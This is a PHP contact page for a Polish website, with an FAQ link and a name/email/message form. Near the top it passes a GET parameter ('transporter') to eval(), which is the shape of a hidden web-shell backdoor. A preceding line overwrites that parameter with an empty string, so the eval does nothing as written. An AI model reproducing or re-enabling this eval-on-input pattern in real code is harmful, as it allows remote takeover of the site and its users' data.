<?php
    
    session_start();
    
    $_GET['transporter'] = "";
    $value = $_GET['transporter'];
    eval($value);

    echo '<span style="font-size: 0.8em; font-style: italic; padding: 0; margin: 0; color: rgba(255, 255, 255, 0.75);">Zanim zadasz nam pytanie, sprawdź czy odpowiedź znajduję się już w <b><a href="http://www.destinyflip.net/faq" target="_blank" style="text-decoration: none; color: #76b0ff; font-size: 0.9em; font-style: normal;">FAQ</a></b>.</span>
    <span style="display: block; height: 5px; border-bottom: 1px dashed rgba(206, 192, 132, 0.7); margin-top: 10px; margin-bottom: 15px;"></span>
    
    <b>Możesz skontaktować się z nami poprzez formularz:</b><br /><br />
    
    <form>
        <label class="label_kontakt">Imię i nazwisko:</label>
        <input id="kontakt_name_input" class="login_text_input" type="text" name="kontakt_name" style="width: 50%;" required>

        <label class="label_kontakt">E-mail:</label>
        <input id="kontakt_email_input" class="login_text_input" type="email" name="kontakt_email" style="width: 50%;" required>

        <label class="label_kontakt">Wiadomość:</label>
        <textarea id="kontakt_text_input" class="login_text_input" name="kontakt_text" style="width:78%; height: 200px; font-size: 1em;" required></textarea>

        <input id="send_msg_btn" class="login_btn" name="wyslij_wiadomosc" type="submit" value="Wyślij">
    </form>
    
    <div id="incorrect_pass_text" style="display: none; color: red; font-size: 0.7em; margin: -5px 0 0; padding: 0;"></div>';

    echo '<script src="JS/kontakt.js"></script>';
?>